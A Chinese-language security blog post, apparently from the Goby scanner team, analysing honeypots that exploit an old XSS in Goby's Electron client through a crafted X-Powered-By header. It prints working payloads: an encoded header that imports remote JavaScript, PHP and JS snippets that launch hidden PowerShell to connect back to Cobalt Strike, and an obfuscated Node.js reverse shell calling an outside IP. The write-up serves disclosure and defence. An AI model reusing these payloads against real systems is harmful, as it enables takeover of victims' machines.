# 0x01 概述

近期我们联动FORadar做了一个插件，实现了从企业名称->企业漏洞的全自动检测流程，在做具体实践的时候碰到了两个很有意思的蜜罐，其中一个蜜罐内置了Weblogic漏洞，同时配置有专门针对旧版本Goby反制Payload，而另一个蜜罐则具备较强的隐蔽性，若非团队有专门研究蜜罐的人员，差点栽在这个蜜罐上，当然，这篇文章主要想聊聊第一个蜜罐，第二个有机会再单独拿出来探讨。

# 0x02 缘起
![在这里插入图片描述](https://img-blog.csdnimg.cn/4097a5d01eb34a558af7adfc43fbfcd8.png#pic_center)


故事的最开始，自然是使用Goby检测到了一个WebLogic远程代码执行漏洞，准备利用此漏洞进行后续动作的时候，团队成员发现这个目标并不简单：
![在这里插入图片描述](https://img-blog.csdnimg.cn/0220647644ee4df18e146a4fa42cdff7.jpeg#pic_center)

在返回包的头部中携带着反制Payload（IP已做脱敏处理）；

```html
X-Powered-By: PHP/7&#38;&#35;&#56;&#54;&#59;&#38;&#35;&#49;&#49;&#48;&#59;&#38;&#35;&#55;&#55;&#59;&#38;&#35;&#54;&#54;&#59;&#38;&#35;&#55;&#49;&#59;&#38;&#35;&#55;&#52;&#59;&#38;&#35;&#56;&#55;&#59;&#38;&#35;&#49;&#49;&#55;&#59;&#38;&#35;&#53;&#55;&#59;&#38;&#35;&#56;&#53;&#59;&#38;&#35;&#49;&#48;&#52;&#59;&#38;&#35;&#49;&#49;&#48;&#59;<img	src=1	onerror=&#x69;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x28;&#x75;&#x6e;&#x65;&#x73;&#x63;&#x61;&#x70;&#x65;&#x28;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#x3a;&#x38;&#x30;&#x38;&#x30;&#x2f;&#x56;&#x6e;&#x4d;&#x42;&#x47;&#x4a;&#x57;&#x75;&#x39;&#x55;&#x68;&#x6e;&#x2f;&#x4e;&#x6f;&#x64;&#x65;&#x2e;&#x6a;&#x73;&#x27;&#x29;&#x29;>
```

显然这是一串经过HTML实体编码的代码，让我们解码看看；

```html
X-Powered-By: PHP/7&#86;&#110;&#77;&#66;&#71;&#74;&#87;&#117;&#57;&#85;&#104;&#110;<img	src=1	onerror=import(unescape('http://127.0.0.1:8080/VnMBGJWu9Uhn/Node.js'))>
```

在这个逻辑上就显而易见了，这是一个常见的XSS Payload，目的是希望执行`/VnMBGJWu9Uhn/Node.js`文件，那么让我们来看看这个js文件；
![在这里插入图片描述](https://img-blog.csdnimg.cn/d932de475a7c4bb9b8fcc338080c2e58.png#pic_center)


可以看到这是一串nodejs的利用代码，作用并不复杂，首先定义一个download函数，从远端下载文件，然后根据操作系统，来下载不同的恶意文件，如果是Windows则直接下载可执行文件，如果是MAC则下载Python3脚本文件，执行Python脚本；

那么现在问题来了，为啥这样就能反制Goby呢？这实际上是一个非常久远的历史漏洞，最早的纰漏的时间是在2021年10月，当月漏洞就已修复并发布新版本，至于漏洞为何存在，得追溯到Goby的组件识别能力，Goby使用Electron构建客户端软件，在Goby的资产界面中，会展示所有符合指纹识别规则的组件名称，比如PHP、IIS等，而为了更为精准的组件识别，Goby会从返回的数据报文中提取版本信息，并在界面渲染展示，在旧版本的Goby中并未对版本信息做无害化处理，从而导致漏洞产生。

# 0x03 缘起如果我用的Goby存在这个漏洞会怎样？

在达成条件之后，这个漏洞能够带来的后果非常严重，可以被反制方直接控制Goby所在的PC，但幸运的是这个漏洞并不是一个0click漏洞，需要Goby的使用人员来配合交互才能达成触发条件。
![在这里插入图片描述](https://img-blog.csdnimg.cn/6f5c7c20884c4f488411bda809ab93af.png#pic_center)


如你所见，这是正常的资产界面，以及版本信息提取结果，但可以通过构造HTTP头部的方式，来对版本信息进行调整，比如这样：

```php
#index.php
<?php
header("X-Powered-By: PHP/<img\tsrc=\"x\"\tonerror=\"alert(1);\">");
?>
```

此时，用户在Goby界面上看到的结果是这样的：

![在这里插入图片描述](https://img-blog.csdnimg.cn/d03b04b8a1a04672b616853c8bdd2d63.jpeg#pic_center)


在界面上可以很清楚的看到反制方所使用的payload，该页面上并不会触发XSS代码，但如果此时只要点击进入IP详情界面，如下图所示，就会触发XSS代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/c44e2d1d4d2548fa9c140012adc9a0cf.jpeg#pic_center)


反制方当然可以利用此漏洞做更多的事情，可以跟上述蜜罐设备一样从远端下载恶意文件并触发执行，也可以直接调用Powershell执行ShellCode，上线CS：

```php
# index.php
<?php
header("X-Powered-By: PHP/<img\tsrc=\"x\"\tonerror=import(unescape('http%3A//119.**.**.135%3A18899/js/1.js'))>");
?>
```

```js
// /js/1.js
(function(){require('child_process').exec('powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAc......(省略)');})();

```

当用户点击进入IP详情页面后，不会有任何感知，但实际上已经悄然执行powershell代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/c763d5f1da7e4bcb9e90ddc208c4b06a.jpeg#pic_center)


成功上线CS

![在这里插入图片描述](https://img-blog.csdnimg.cn/df5b2c30d0b74ccaac1a1c1ac9a9fea7.jpeg#pic_center)


所以，尽快升级Goby到最新版本吧~~，除了自身漏洞的修复，我们也一直在推出更多好用、实用的新功能期待师傅们的体验和反馈。

# 0x04 还有多少个蜜罐在望眼欲穿呢？

正如我们前文所说，这是一个已经修复近两年前的漏洞了，但是在全球范围内，仍然有着大量的蜜罐设备，再等待着某一个仍然使用旧版本Goby的好心人，我们可以使用一条FOFA语法便可以很快的找到这些目标：

```bash
header="img" && header="onerror"
```

可以看到，在全球范围内，有近1899条蜜罐记录，其Payload也大同小异，与前文碰到的蜜罐设备一致，有意思的是在境外也有数十条记录（~~老外也想反制Goby？~~）。

而从产品分布的角度来说，这类蜜罐广泛覆盖在：深信服VPN、致远OA、RANZHIOA、泛微OA、phpMyAdmin等在攻防场景中广泛涉及的产品和应用，师傅们碰到这些资产可要多个心眼。
![在这里插入图片描述](https://img-blog.csdnimg.cn/b3fe8dc14d6b4b36b7d4318797f5763a.png#pic_center)


![在这里插入图片描述](https://img-blog.csdnimg.cn/6e52b8829226455c8101aaa2d2ca1b7f.png#pic_center)



我们也可以对Fofa语法进行略微的调整，看看有没有一些新东西

```bash
header="img" && header="onerror" && header!="PHP"
```

剔除掉同类蜜罐后，仅剩下160条记录，明显有着与之前蜜罐设备不同的利用方式
![在这里插入图片描述](https://img-blog.csdnimg.cn/df09f55ecdf445a9be0343c96fb13667.png#pic_center)


```bash
X-Powered-By: <img src=# onerror=window.open('https://202.**.***.12/help.html')>
```

跟进到help.html之后，发现是一个经过混淆的Payload

```html
<!-- help.html !-->
<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8" />
    <script>
        var _0x1c94=['temp.js','utf8','writeFile','uuid','child_process','fork','/tmp/temp.js'];var _0x4cc5=function(_0x1c94c3,_0x4cc551){_0x1c94c3=_0x1c94c3-0x0;var _0x3be382=_0x1c94[_0x1c94c3];return _0x3be382;};var _0x551876='';var _0x840f11='\x0avar\x20_0x411b=[\x27net\x27,\x27child_process\x27,\x27platform\x27,\x27spawn\x27,\x27/bin/bash\x27,\x27Socket\x27,\x27connect\x27,\x27stdout\x27,\x27pipe\x27];var\x20_0x4b64=function(_0x411be0,_0x4b6451){_0x411be0=_0x411be0-0x0;var\x20_0x278a8f=_0x411b[_0x411be0];return\x20_0x278a8f;};var\x20_0x1f656a=\x27106.75.15.34\x27;var\x20_0xb2ca98=\x2722220\x27;(function(){var\x20_0x58cd49=require(\x27os\x27);var\x20_0x20a0b2=require(\x27fs\x27);var\x20_0x2af086=require(_0x4b64(\x270x0\x27));var\x20_0x597913=require(_0x4b64(\x270x1\x27));var\x20_0x269932=_0x58cd49[_0x4b64(\x270x2\x27)]();if(_0x269932==\x27win32\x27){var\x20_0x16b7e1=_0x597913[\x27spawn\x27](\x27cmd\x27,[]);}else{var\x20_0x16b7e1=_0x597913[_0x4b64(\x270x3\x27)](_0x4b64(\x270x4\x27),[\x27-i\x27]);}var\x20_0x293f60=new\x20_0x2af086[(_0x4b64(\x270x5\x27))]();_0x293f60[_0x4b64(\x270x6\x27)](_0xb2ca98,_0x1f656a,function(){_0x293f60[\x27pipe\x27](_0x16b7e1[\x27stdin\x27]);_0x16b7e1[_0x4b64(\x270x7\x27)][_0x4b64(\x270x8\x27)](_0x293f60);_0x16b7e1[\x27stderr\x27][\x27pipe\x27](_0x293f60);});return/a/;}());\x0a';var _0x2b76a6=require('fs');var _0x512c82=require('os')['platform']();if(_0x512c82=='win32'){_0x2b76a6['writeFile'](_0x4cc5('0x0'),_0x840f11,_0x4cc5('0x1'),function(_0x4af088){});_0x2b76a6[_0x4cc5('0x2')](_0x4cc5('0x3'),_0x551876,_0x4cc5('0x1'),function(_0x3e2b1c){});require(_0x4cc5('0x4'))[_0x4cc5('0x5')](_0x4cc5('0x0'),{'detached':!![]});}else{_0x2b76a6[_0x4cc5('0x2')](_0x4cc5('0x6'),_0x840f11,_0x4cc5('0x1'),function(_0x261f0f){});_0x2b76a6['writeFile']('/tmp/uuid',_0x551876,'utf8',function(_0x474cc8){});require('child_process')['fork'](_0x4cc5('0x6'),{'detached':!![]});}
    </script>
</head>

<body>
</body>
</html>
```

虽然绝大部分代码已经经过混淆，但不难看出Payload的用意是将恶意文件写入磁盘并调用执行，但从最初的语法来说，这应该并不止针对于Goby的蜜罐设备，在Goby中没能，推测可能是某一种扫描器，该扫描器使用了某种框架 ，既集成了浏览器的解析环境，又可以直接在该浏览器的解析环境中调用node.js的代码，从而触发反制者的Payload。

# 0x05 尾声

到这里关于蜜罐的分析就结束了，也提前预告一下我们最近在为Goby实战场景的最佳实践做了大量的测试，目前也小有收获，近期会发布相关版本和文章，希望师傅们保持关注不要错过~

# 0x06 参考

- [闲来无事，反制Goby](https://mp.weixin.qq.com/s/EPQZs5eQ4LL--tao93cUfQ)




Goby 官网: https://gobysec.net/
如果您有任何反馈建议，您可通过提交 issue 或是以下方式联系我们：
GitHub issue: https://github.com/gobysec/Goby/issues
微信群：关注公众号“GobySec“，回复暗号”加群“ （社群优势：可第一时间了解Goby功能发布、活动等咨询）
Telegram Group: http://t.me/gobies
推特：https://twitter.com/GobySec
